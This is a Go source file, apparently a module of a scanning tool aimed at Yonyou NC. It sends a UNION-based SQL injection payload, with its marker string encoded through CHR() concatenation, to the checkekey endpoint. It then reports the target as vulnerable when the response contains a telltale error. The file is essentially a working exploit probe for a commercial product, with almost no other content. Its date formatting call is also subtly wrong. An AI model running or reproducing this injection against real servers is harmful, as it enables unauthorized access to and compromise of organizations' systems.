package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func CheckekeyScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	const MobileUploadIcon = "用友 NC checkekey SQL 注入漏洞"
	urls := address + "/portal/pt/office/checkekey?pageId=login"

	// 发送 POST 请求
	response, err := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("user=1'UNION ALL SELECT NULL,CHR(55)||CHR(54)||CHR(57)||CHR(52)||CHR(102)||CHR(52)||CHR(97)||CHR(54)||CHR(54)||CHR(51)||CHR(49)||CHR(54)||CHR(101)||CHR(53)||CHR(51)||CHR(99)||CHR(56)||CHR(99)||CHR(100)||CHR(100)||CHR(57)||CHR(100)||CHR(57)||CHR(57)||CHR(53)||CHR(52)||CHR(98)||CHR(100)||CHR(54)||CHR(49)||CHR(49)||CHR(100),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL-- xiao&ekey=1"))
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon)
		}
		return
	}
	defer response.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon, err)
		fmt.Println(output)
		return
	}

	// 检查漏洞是否存在
	if strings.Contains(string(body), "invalid UFDateTime") {
		result := MobileUploadIcon + "：" + urls
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Cyan, currentTime, Reset, Green, Reset, MobileUploadIcon, urls)
		fmt.Println(output)

		// 保存结果到文件
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		if err := Utils.SaveResultToFile(result, filename); err != nil {
			output := fmt.Sprintf("[%s%s%s] [%s-%s] %s 保存结果到文件出错: %v", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon, err)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, MobileUploadIcon, response.StatusCode)
		fmt.Println(output)
	}
}
